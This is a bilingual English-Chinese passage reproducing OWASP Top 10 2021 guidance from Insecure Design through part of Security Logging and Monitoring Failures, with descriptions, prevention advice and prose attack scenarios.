<h2 id="A04-Insecure-Design不安全的设计"><a href="#A04-Insecure-Design不安全的设计" class="headerlink" title="A04 Insecure Design不安全的设计"></a><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">A04 Insecure Design</a>不安全的设计</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>Insecure design is a broad category representing different weaknesses, expressed as “missing or ineffective control design.” Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. We differentiate between design flaws and implementation defects for a reason, they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks. One of the factors that contribute to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.<br>不安全设计是一个广泛的类别，代表不同的弱点，表示为 “缺失或无效的控制设计”。不安全设计并不是所有其他 10 大风险类别的来源。不安全设计和不安全实现之间存在差异。我们区分设计缺陷和实现缺陷是有原因的，它们具有不同的根本原因和补救措施。安全设计仍可能存在实现缺陷，从而导致可能被利用的漏洞。不安全的设计无法通过完美的实现来解决，因为根据定义，从未创建过所需的安全控制来防御特定的攻击。导致不安全设计的因素之一是正在开发的软件或系统缺乏固有的业务风险分析，因此无法确定需要什么级别的安全设计。</p>
<h4 id="Requirements-and-Resource-Management"><a href="#Requirements-and-Resource-Management" class="headerlink" title="Requirements and Resource Management"></a>Requirements and Resource Management</h4><p>Collect and negotiate the business requirements for an application with the business, including the protection requirements concerning confidentiality, integrity, availability, and authenticity of all data assets and the expected business logic. Take into account how exposed your application will be and if you need segregation of tenants (additionally to access control). Compile the technical requirements, including functional and non-functional security requirements. Plan and negotiate the budget covering all design, build, testing, and operation, including security activities.<br>收集并与业务部门协商应用程序的业务要求，包括有关所有数据资产的机密性、完整性、可用性和真实性以及预期业务逻辑的保护要求。考虑您的应用程序的暴露程度，以及您是否需要隔离租户（除了访问控制之外）。编译技术要求，包括功能性和非功能性安全要求。规划和协商涵盖所有设计、构建、测试和操作（包括安全活动）的预算。</p>
<h4 id="Secure-Design"><a href="#Secure-Design" class="headerlink" title="Secure Design"></a>Secure Design</h4><p>Secure design is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods. Threat modeling should be integrated into refinement sessions (or similar activities); look for changes in data flows and access control or other security controls. In the user story development determine the correct flow and failure states, ensure they are well understood and agreed upon by responsible and impacted parties. Analyze assumptions and conditions for expected and failure flows, ensure they are still accurate and desirable. Determine how to validate the assumptions and enforce conditions needed for proper behaviors. Ensure the results are documented in the user story. Learn from mistakes and offer positive incentives to promote improvements. Secure design is neither an add-on nor a tool that you can add to software.<br>安全设计是一种文化和方法，它不断评估威胁，并确保代码经过稳健的设计和测试，以防止已知的攻击方法。威胁建模应集成到优化会话（或类似活动）中;查找数据流和访问控制或其他安全控制的变化。在用户故事开发中，确定正确的流程和故障状态，确保责任方和受影响的各方充分理解并就它们达成一致。分析预期流和故障流的假设和条件，确保它们仍然是准确和理想的。确定如何验证假设并强制实施正确行为所需的条件。确保结果记录在用户情景中。从错误中吸取教训，并提供积极的激励措施来促进改进。安全设计既不是附加组件，也不是可以添加到软件中的工具。</p>
<h4 id="Secure-Development-Lifecycle"><a href="#Secure-Development-Lifecycle" class="headerlink" title="Secure Development Lifecycle"></a>Secure Development Lifecycle</h4><p>Secure software requires a secure development lifecycle, some form of secure design pattern, paved road methodology, secured component library, tooling, and threat modeling. Reach out for your security specialists at the beginning of a software project throughout the whole project and maintenance of your software. Consider leveraging the <a href="https://owaspsamm.org/">OWASP Software Assurance Maturity Model (SAMM)</a> to help structure your secure software development efforts.<br>安全软件需要安全的开发生命周期、某种形式的安全设计模式、铺砌道路方法、安全组件库、工具和威胁建模。在软件项目开始时，在整个项目和软件维护过程中联系您的安全专家。考虑利用 <a href="https://owaspsamm.org/">OWASP 软件保障成熟度模型 （SAMM）</a> 来帮助构建安全的软件开发工作。</p>
<h3 id="How-to-Prevent-3"><a href="#How-to-Prevent-3" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><ul>
<li>Establish and use a secure development lifecycle with AppSec professionals to help evaluate and design security and privacy-related controls<br>与 AppSec 专业人员一起建立和使用安全的开发生命周期，以帮助评估和设计与安全和隐私相关的控制措施</li>
<li>Establish and use a library of secure design patterns or paved road ready to use components<br>建立并使用安全设计模式库或已铺设的即用型组件</li>
<li>Use threat modeling for critical authentication, access control, business logic, and key flows<br>将威胁建模用于关键身份验证、访问控制、业务逻辑和密钥流</li>
<li>Integrate security language and controls into user stories<br>将安全语言和控制集成到用户情景中</li>
<li>Integrate plausibility checks at each tier of your application (from frontend to backend)<br>在应用程序的每一层（从前端到后端）集成合理性检查</li>
<li>Write unit and integration tests to validate that all critical flows are resistant to the threat model. Compile use-cases <em>and</em> misuse-cases for each tier of your application.<br>编写单元和集成测试以验证所有关键流是否都能抵抗威胁模型。为应用程序的每一层编译使用案例<em>和</em>误用案例。</li>
<li>Segregate tier layers on the system and network layers depending on the exposure and protection needs<br>根据暴露和保护需求，在系统和网络层上隔离层</li>
<li>Segregate tenants robustly by design throughout all tiers<br>通过设计在所有层中稳健地隔离租户</li>
<li>Limit resource consumption by user or service<br>限制用户或服务的资源消耗</li>
</ul>
<h3 id="Example-Attack-Scenarios-3"><a href="#Example-Attack-Scenarios-3" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> A credential recovery workflow might include “questions and answers,” which is prohibited by NIST 800-63b, the OWASP ASVS, and the OWASP Top 10. Questions and answers cannot be trusted as evidence of identity as more than one person can know the answers, which is why they are prohibited. Such code should be removed and replaced with a more secure design.<br><strong>场景 #1：</strong>凭证恢复工作流程可能包括 NIST 800-63b、OWASP ASVS 和 OWASP Top 10 禁止的“问题和答案”。问题和答案不能被信任为身份证明，因为不止一个人可以知道答案，这就是它们被禁止的原因。应删除此类代码，并将其替换为更安全的设计。</p>
<p><strong>Scenario #2:</strong> A cinema chain allows group booking discounts and has a maximum of fifteen attendees before requiring a deposit. Attackers could threat model this flow and test if they could book six hundred seats and all cinemas at once in a few requests, causing a massive loss of income.<br><strong>场景 #2：</strong>连锁电影院允许团体预订折扣，并且在需要押金之前最多可容纳 15 名参与者。攻击者可以威胁地模拟此流程，并测试他们是否可以在几个请求中同时预订 600 个座位和所有电影院，从而导致巨大的收入损失。</p>
<p><strong>Scenario #3:</strong> A retail chain’s e-commerce website does not have protection against bots run by scalpers buying high-end video cards to resell auction websites. This creates terrible publicity for the video card makers and retail chain owners and enduring bad blood with enthusiasts who cannot obtain these cards at any price. Careful anti-bot design and domain logic rules, such as purchases made within a few seconds of availability, might identify inauthentic purchases and rejected such transactions.<br><strong>场景 #3：</strong>零售连锁店的电子商务网站没有保护措施来防止黄牛购买高端视频卡转售拍卖网站所运行的机器人。这给视频卡制造商和零售连锁店所有者带来了可怕的宣传，并与无法以任何价格获得这些卡的爱好者忍受了不满。仔细的反机器人设计和域逻辑规则（例如在可用后的几秒钟内进行购买）可能会识别出不真实的购买并拒绝此类交易。</p>
<h2 id="A05-Security-Misconfiguration安全配置错误"><a href="#A05-Security-Misconfiguration安全配置错误" class="headerlink" title="A05 Security Misconfiguration安全配置错误"></a><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05 Security Misconfiguration</a>安全配置错误</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>The application might be vulnerable if the application is:<br>如果应用程序处于以下状态，则应用程序可能容易受到攻击：</p>
<ul>
<li>Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.<br>在应用程序堆栈的任何部分缺少适当的安全强化，或者对云服务的权限配置不正确。</li>
<li>Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).<br>启用或安装了不必要的功能（例如，不必要的端口、服务、页面、帐户或权限）。</li>
<li>Default accounts and their passwords are still enabled and unchanged.<br>默认帐户及其密码仍处于启用状态且保持不变。</li>
<li>Error handling reveals stack traces or other overly informative error messages to users.<br>错误处理会向用户显示堆栈跟踪或其他信息过多的错误消息。</li>
<li>For upgraded systems, the latest security features are disabled or not configured securely.<br>对于已升级的系统，最新的安全功能被禁用或未安全配置。</li>
<li>The security settings in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., are not set to secure values.<br>应用程序服务器、应用程序框架（例如 Struts、Spring、ASP.NET）、库、数据库等中的安全设置未设置为 secure 值。</li>
<li>The server does not send security headers or directives, or they are not set to secure values.<br>服务器不发送安全标头或指令，或者它们未设置为 secure 值。</li>
<li>The software is out of date or vulnerable (see <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06:2021-Vulnerable and Outdated Components</a>).<br>软件已过期或易受攻击（请参阅 <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06：2021 - 易受攻击和过时的组件</a>）。</li>
</ul>
<p>Without a concerted, repeatable application security configuration process, systems are at a higher risk.<br>如果没有协调一致、可重复的应用程序安全配置过程，系统将面临更高的风险。</p>
<h3 id="How-to-Prevent-4"><a href="#How-to-Prevent-4" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>Secure installation processes should be implemented, including:<br>应实施安全的安装过程，包括：</p>
<ul>
<li>A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. This process should be automated to minimize the effort required to set up a new secure environment.<br>可重复的强化过程可以快速轻松地部署另一个适当锁定的环境。开发、QA 和生产环境都应该配置相同，每个环境使用不同的凭证。此过程应自动执行，以最大程度地减少设置新的安全环境所需的工作量。</li>
<li>A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.<br>一个不包含任何不必要功能、组件、文档和示例的最小平台。删除或不安装未使用的功能和框架。</li>
<li>A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06:2021-Vulnerable and Outdated Components</a>). Review cloud storage permissions (e.g., S3 bucket permissions).<br>作为补丁管理流程的一部分，用于查看和更新适用于所有安全说明、更新和补丁的配置的任务（请参阅 <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06：2021 - 易受攻击和过时的组件</a>）。查看云存储权限（例如 S3 存储桶权限）。</li>
<li>A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).<br>分段应用程序架构通过分段、容器化或云安全组 （ACL） 在组件或租户之间提供有效且安全的分离。</li>
<li>Sending security directives to clients, e.g., Security Headers.<br>向客户端发送安全指令，例如 Security Headers。</li>
<li>An automated process to verify the effectiveness of the configurations and settings in all environments.<br>一个自动化过程，用于验证所有环境中配置和设置的有效性。</li>
</ul>
<h3 id="Example-Attack-Scenarios-4"><a href="#Example-Attack-Scenarios-4" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> The application server comes with sample applications not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. Suppose one of these applications is the admin console, and default accounts weren’t changed. In that case, the attacker logs in with default passwords and takes over.<br><strong>场景 #1：</strong>应用程序服务器附带未从生产服务器中删除的示例应用程序。这些示例应用程序具有攻击者用来破坏服务器的已知安全漏洞。假设其中一个应用程序是 Admin Console，并且默认帐户未更改。在这种情况下，攻击者使用默认密码登录并接管。</p>
<p><strong>Scenario #2:</strong> Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a severe access control flaw in the application.<br><strong>场景 #2：</strong>目录列表未在服务器上禁用。攻击者发现他们只需列出目录即可。攻击者找到并下载编译好的 Java 类，然后对其进行反编译和逆向工程以查看代码。然后，攻击者在应用程序中发现严重的访问控制缺陷。</p>
<p><strong>Scenario #3:</strong> The application server’s configuration allows detailed error messages, e.g., stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.<br><strong>场景 #3：</strong>应用服务器的配置允许向用户返回详细的错误消息，例如堆栈跟踪。这可能会暴露敏感信息或潜在缺陷，例如已知易受攻击的组件版本。</p>
<p><strong>Scenario #4:</strong> A cloud service provider (CSP) has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.<br><strong>场景 #4：</strong>云服务提供商 （CSP） 具有其他 CSP 用户向 Internet 开放的默认共享权限。这允许访问存储在云存储中的敏感数据。</p>
<h2 id="A06-Vulnerable-and-Outdated-Components易损和过时的组件"><a href="#A06-Vulnerable-and-Outdated-Components易损和过时的组件" class="headerlink" title="A06 Vulnerable and Outdated Components易损和过时的组件"></a><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06 Vulnerable and Outdated Components</a>易损和过时的组件</h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><p>You are likely vulnerable:<br>您可能容易受到攻击：</p>
<ul>
<li>If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.<br>如果您不知道使用的所有组件（客户端和服务器端）的版本。这包括您直接使用的组件以及嵌套的依赖项。</li>
<li>If the software is vulnerable, unsupported, or out of date. This includes the OS, web&#x2F;application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.<br>如果软件易受攻击、不受支持或已过期。这包括操作系统、Web&#x2F;应用程序服务器、数据库管理系统 （DBMS）、应用程序、API 和所有组件、运行时环境和库。</li>
<li>If you do not scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.<br>如果您不定期扫描漏洞并订阅与您使用的组件相关的安全公告。</li>
<li>If you do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in environments when patching is a monthly or quarterly task under change control, leaving organizations open to days or months of unnecessary exposure to fixed vulnerabilities.<br>如果您未以基于风险的及时方式修复或升级底层平台、框架和依赖项。这通常发生在补丁是变更控制下的月度或季度任务的环境中，这使得组织面临数天或数月不必要地暴露于已修复漏洞的环境中。</li>
<li>If software developers do not test the compatibility of updated, upgraded, or patched libraries.<br>如果软件开发人员不测试已更新、升级或修补的库的兼容性。</li>
<li>If you do not secure the components’ configurations (see <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05:2021-Security Misconfiguration</a>).<br>如果不保护组件的配置（请参阅 <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05：2021 - 安全配置错误</a>）。</li>
</ul>
<h3 id="How-to-Prevent-5"><a href="#How-to-Prevent-5" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><p>There should be a patch management process in place to:<br>应该有一个补丁管理流程来：</p>
<ul>
<li>Remove unused dependencies, unnecessary features, components, files, and documentation.<br>删除未使用的依赖项、不必要的功能、组件、文件和文档。</li>
<li>Continuously inventory the versions of both client-side and server-side components (e.g., frameworks, libraries) and their dependencies using tools like versions, OWASP Dependency Check, retire.js, etc. Continuously monitor sources like Common Vulnerability and Exposures (CVE) and National Vulnerability Database (NVD) for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.<br>使用版本、OWASP Dependency Check 等工具持续清点客户端和服务器端组件（例如框架、库）的版本及其依赖项retire.js。持续监控常见漏洞和披露 （CVE） 和国家漏洞数据库 （NVD） 等来源，以查找组件中的漏洞。使用软件组件分析工具自动执行该过程。订阅电子邮件警报，了解与您使用的组件相关的安全漏洞。</li>
<li>Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component (See A08:2021-Software and Data Integrity Failures).<br>仅通过安全链接从官方来源获取组件。首选已签名的软件包，以减少包含已修改的恶意组件的可能性（请参阅 A08：2021 - 软件和数据完整性故障）。</li>
<li>Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor, detect, or protect against the discovered issue.<br>监控未维护或未为旧版本创建安全补丁的库和组件。如果无法进行修补，请考虑部署虚拟补丁来监控、检测或防范发现的问题。</li>
</ul>
<p>Every organization must ensure an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.<br>每个组织都必须确保在应用程序或产品组合的生命周期内有一个持续的计划，用于监控、分类和应用更新或配置更改。</p>
<h3 id="Example-Attack-Scenarios-5"><a href="#Example-Attack-Scenarios-5" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g., coding error) or intentional (e.g., a backdoor in a component). Some example exploitable component vulnerabilities discovered are:<br><strong>场景 #1：</strong>组件通常使用与应用程序本身相同的权限运行，因此任何组件中的缺陷都可能导致严重影响。此类缺陷可能是意外的（例如，编码错误）或故意的（例如，组件中的后门）。发现的一些可利用组件漏洞示例包括：</p>
<ul>
<li>CVE-2017-5638, a Struts 2 remote code execution vulnerability that enables the execution of arbitrary code on the server, has been blamed for significant breaches.<br>CVE-2017-5638 是一个 Struts 2 远程代码执行漏洞，允许在服务器上执行任意代码，已被指责为重大违规事件的罪魁祸首。</li>
<li>While the internet of things (IoT) is frequently difficult or impossible to patch, the importance of patching them can be great (e.g., biomedical devices).<br>虽然物联网 （IoT） 通常很难或不可能修补，但修补它们的重要性可能非常大（例如，生物医学设备）。</li>
</ul>
<p>There are automated tools to help attackers find unpatched or misconfigured systems. For example, the Shodan IoT search engine can help you find devices that still suffer from Heartbleed vulnerability patched in April 2014.<br>有一些自动化工具可以帮助攻击者找到未修补或配置错误的系统。例如，Shodan IoT 搜索引擎可以帮助您找到仍然存在 2014 年 4 月修补的 Heartbleed 漏洞的设备。</p>
<h2 id="A07-Identification-and-Authentication-Failures识别和身份验证失败"><a href="#A07-Identification-and-Authentication-Failures识别和身份验证失败" class="headerlink" title="A07 Identification and Authentication Failures识别和身份验证失败"></a><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">A07 Identification and Authentication Failures</a>识别和身份验证失败</h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>Confirmation of the user’s identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:<br>确认用户的身份、身份验证和会话管理对于防范与身份验证相关的攻击至关重要。如果应用程序：</p>
<ul>
<li>Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.<br>允许自动攻击，例如撞库攻击，其中攻击者拥有有效用户名和密码的列表。</li>
<li>Permits brute force or other automated attacks.<br>允许暴力攻击或其他自动攻击。</li>
<li>Permits default, weak, or well-known passwords, such as “Password1” or “admin&#x2F;admin”.<br>允许使用默认密码、弱密码或已知密码，例如 “Password1” 或 “admin&#x2F;admin”。</li>
<li>Uses weak or ineffective credential recovery and forgot-password processes, such as “knowledge-based answers,” which cannot be made safe.<br>使用弱或无效的凭据恢复和忘记密码流程，例如“基于知识的答案”，这些流程无法确保安全。</li>
<li>Uses plain text, encrypted, or weakly hashed passwords data stores (see <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">A02:2021-Cryptographic Failures</a>).<br>使用纯文本、加密或弱哈希密码数据存储（请参阅 <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">A02：2021 - 加密失败</a>）。</li>
<li>Has missing or ineffective multi-factor authentication.<br>多重身份验证缺失或无效。</li>
<li>Exposes session identifier in the URL.<br>在 URL 中公开会话标识符。</li>
<li>Reuse session identifier after successful login.<br>成功登录后重用会话标识符。</li>
<li>Does not correctly invalidate Session IDs. User sessions or authentication tokens (mainly single sign-on (SSO) tokens) aren’t properly invalidated during logout or a period of inactivity.<br>无法正确使会话 ID 失效。用户会话或身份验证令牌（主要是单点登录 （SSO） 令牌）在注销或处于非活动状态期间未正确失效。</li>
</ul>
<h3 id="How-to-Prevent-6"><a href="#How-to-Prevent-6" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><ul>
<li>Where possible, implement multi-factor authentication to prevent automated credential stuffing, brute force, and stolen credential reuse attacks.<br>在可能的情况下，实施多因素身份验证，以防止自动撞库、暴力破解和被盗凭据重用攻击。</li>
<li>Do not ship or deploy with any default credentials, particularly for admin users.<br>请勿使用任何默认凭证进行交付或部署，尤其是对于管理员用户。</li>
<li>Implement weak password checks, such as testing new or changed passwords against the top 10,000 worst passwords list.<br>实施弱密码检查，例如根据前 10,000 个最差密码列表测试新密码或更改的密码。</li>
<li>Align password length, complexity, and rotation policies with National Institute of Standards and Technology (NIST) 800-63b’s guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence-based password policies.<br>使密码长度、复杂性和轮换策略与美国国家标准与技术研究院 （NIST） 第 5.1.1 节中关于记住的秘密的指南或其他现代、基于证据的密码策略保持一致。</li>
<li>Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.<br>通过对所有结果使用相同的消息，确保注册、凭证恢复和 API 路径针对账户枚举攻击得到强化。</li>
<li>Limit or increasingly delay failed login attempts, but be careful not to create a denial of service scenario. Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.<br>限制或逐渐延迟失败的登录尝试，但请注意不要创建拒绝服务场景。记录所有故障，并在检测到撞库攻击、暴力破解或其他攻击时提醒管理员。</li>
<li>Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session identifier should not be in the URL, be securely stored, and invalidated after logout, idle, and absolute timeouts.<br>使用服务器端安全的内置会话管理器，该管理器在登录后生成具有高熵的新随机会话 ID。会话标识符不应位于 URL 中，不应被安全存储，并在注销、空闲和绝对超时后失效。</li>
</ul>
<h3 id="Example-Attack-Scenarios-6"><a href="#Example-Attack-Scenarios-6" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1:</strong> Credential stuffing, the use of lists of known passwords, is a common attack. Suppose an application does not implement automated threat or credential stuffing protection. In that case, the application can be used as a password oracle to determine if the credentials are valid.<br><strong>场景 #1：</strong>撞库攻击，即使用已知密码列表，是一种常见的攻击。假设应用程序未实现自动威胁或撞库保护。在这种情况下，应用程序可以用作密码 oracle 来确定凭证是否有效。</p>
<p><strong>Scenario #2:</strong> Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements encourage users to use and reuse weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and use multi-factor authentication.<br><strong>场景 #2：</strong>大多数身份验证攻击的发生是由于持续使用密码作为唯一因素。一旦考虑了最佳实践，密码轮换和复杂性要求就会鼓励用户使用和重复使用弱密码。建议组织根据 NIST 800-63 停止这些做法，并使用多因素身份验证。</p>
<p><strong>Scenario #3:</strong> Application session timeouts aren’t set correctly. A user uses a public computer to access an application. Instead of selecting “logout,” the user simply closes the browser tab and walks away. An attacker uses the same browser an hour later, and the user is still authenticated.<br><strong>场景 #3：</strong>应用程序会话超时设置不正确。用户使用公共计算机访问应用程序。用户无需选择 “注销”，只需关闭浏览器选项卡并走开即可。攻击者在一小时后使用相同的浏览器，并且用户仍然通过身份验证。</p>
<h2 id="A08-Software-and-Data-Integrity-Failures软件和数据完整性故障"><a href="#A08-Software-and-Data-Integrity-Failures软件和数据完整性故障" class="headerlink" title="A08 Software and Data Integrity Failures软件和数据完整性故障"></a><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">A08 Software and Data Integrity Failures</a>软件和数据完整性故障</h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). An insecure CI&#x2F;CD pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Another example is where objects or data are encoded or serialized into a structure that an attacker can see and modify is vulnerable to insecure deserialization.<br>软件和数据完整性故障与无法防止完整性违规的代码和基础设施有关。例如，应用程序依赖于来自不受信任的来源、存储库和内容交付网络 （CDN） 的插件、库或模块。不安全的 CI&#x2F;CD 管道可能会带来未经授权的访问、恶意代码或系统泄露的可能性。最后，许多应用程序现在都包含自动更新功能，在该功能中，在没有充分完整性验证的情况下下载更新，并将其应用于以前受信任的应用程序。攻击者可能会上传自己的更新，以便在所有安装上分发和运行。另一个示例是，对象或数据被编码或序列化为攻击者可以看到和修改的结构，该结构容易受到不安全反序列化的攻击。</p>
<h3 id="How-to-Prevent-7"><a href="#How-to-Prevent-7" class="headerlink" title="How to Prevent"></a>How to Prevent</h3><ul>
<li>Use digital signatures or similar mechanisms to verify the software or data is from the expected source and has not been altered.<br>使用数字签名或类似机制来验证软件或数据是否来自预期来源，并且未被更改。</li>
<li>Ensure libraries and dependencies, such as npm or Maven, are consuming trusted repositories. If you have a higher risk profile, consider hosting an internal known-good repository that’s vetted.<br>确保库和依赖项（如 npm 或 Maven）正在使用受信任的存储库。如果您的风险状况较高，请考虑托管经过审查的内部已知良好的存储库。</li>
<li>Ensure that a software supply chain security tool, such as OWASP Dependency Check or OWASP CycloneDX, is used to verify that components do not contain known vulnerabilities<br>确保使用软件供应链安全工具（如 OWASP Dependency Check 或 OWASP CycloneDX）来验证组件不包含已知漏洞</li>
<li>Ensure that there is a review process for code and configuration changes to minimize the chance that malicious code or configuration could be introduced into your software pipeline.<br>确保对代码和配置更改有一个审查流程，以最大程度地减少将恶意代码或配置引入软件管道的可能性。</li>
<li>Ensure that your CI&#x2F;CD pipeline has proper segregation, configuration, and access control to ensure the integrity of the code flowing through the build and deploy processes.<br>确保您的 CI&#x2F;CD 管道具有适当的隔离、配置和访问控制，以确保流经构建和部署过程的代码的完整性。</li>
<li>Ensure that unsigned or unencrypted serialized data is not sent to untrusted clients without some form of integrity check or digital signature to detect tampering or replay of the serialized data<br>确保未签名或未加密的序列化数据不会发送到不受信任的客户端，而无需进行某种形式的完整性检查或数字签名，以检测序列化数据的篡改或重放</li>
</ul>
<h3 id="Example-Attack-Scenarios-7"><a href="#Example-Attack-Scenarios-7" class="headerlink" title="Example Attack Scenarios"></a>Example Attack Scenarios</h3><p><strong>Scenario #1 Update without signing:</strong> Many home routers, set-top boxes, device firmware, and others do not verify updates via signed firmware. Unsigned firmware is a growing target for attackers and is expected to only get worse. This is a major concern as many times there is no mechanism to remediate other than to fix in a future version and wait for previous versions to age out.<br><strong>场景 #1 更新而不签名：</strong>许多家用路由器、机顶盒、设备固件和其他设备不通过签名固件验证更新。未签名的固件是攻击者日益增长的目标，而且预计只会变得更糟。这是一个主要问题，因为很多时候，除了在将来的版本中修复并等待以前的版本过期之外，没有其他补救机制。</p>
<p><strong>Scenario #2 SolarWinds malicious update</strong>: Nation-states have been known to attack update mechanisms, with a recent notable attack being the SolarWinds Orion attack. The company that develops the software had secure build and update integrity processes. Still, these were able to be subverted, and for several months, the firm distributed a highly targeted malicious update to more than 18,000 organizations, of which around 100 or so were affected. This is one of the most far-reaching and most significant breaches of this nature in history.<br><strong>场景 #2 SolarWinds 恶意更新</strong>：已知民族国家会攻击更新机制，最近一次值得注意的攻击是 SolarWinds Orion 攻击。开发软件的公司具有安全的构建和更新完整性流程。尽管如此，这些仍然能够被破坏，并且在几个月内，该公司向 18,000 多个组织分发了高度针对性的恶意更新，其中大约 100 个组织受到影响。这是历史上影响最深远、最重大的此类违规行为之一。</p>
<p><strong>Scenario #3 Insecure Deserialization:</strong> A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing the user state and passing it back and forth with each request. An attacker notices the “rO0” Java object signature (in base64) and uses the Java Serial Killer tool to gain remote code execution on the application server.<br><strong>场景 #3 不安全的反序列化：</strong>React 应用程序调用一组 Spring Boot 微服务。作为函数式程序员，他们试图确保他们的代码是不可变的。他们提出的解决方案是序列化用户状态，并在每个请求中来回传递它。攻击者注意到 “rO0” Java 对象签名（以 base64 为单位），并使用 Java Serial Killer 工具在应用程序服务器上远程执行代码。</p>
<h2 id="A09-Security-Logging-and-Monitoring-Failures-安全日志记录和监控故障"><a href="#A09-Security-Logging-and-Monitoring-Failures-安全日志记录和监控故障" class="headerlink" title="A09 Security Logging and Monitoring Failures       安全日志记录和监控故障"></a><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">A09 Security Logging and Monitoring Failures       </a>安全日志记录和监控故障</h2><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>Returning to the OWASP Top 10 2021, this category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs any time:<br>回到 2021 年 OWASP Top 10，此类别旨在帮助检测、升级和响应主动泄露。如果没有日志记录和监控，就无法检测到违规行为。日志记录、检测、监控和主动响应不足随时发生：</p>
<ul>
<li>Auditable events, such as logins, failed logins, and high-value transactions, are not logged.<br>不会记录可审计的事件，例如登录、登录失败和高价值交易。</li>
<li>Warnings and errors generate no, inadequate, or unclear log messages.<br>警告和错误会生成 no、inadequate 或不清楚的日志消息。</li>
<li>Logs of applications and APIs are not monitored for suspicious activity.<br>不会监控应用程序和 API 的日志是否存在可疑活动。</li>
<li>Logs are only stored locally.<br>日志仅存储在本地。</li>
<li>Appropriate alerting thresholds and response escalation processes are not in place or effective.<br>适当的警报阈值和响应升级流程未到位或无效。</li>
<li>Penetration testing and scans by dynamic application security testing (DAST) tools (such as OWASP ZAP) do not trigger alerts.<br>动态应用程序安全测试 （DAST） 工具（如 OWASP ZAP）的渗透测试和扫描不会触发警报。</li>
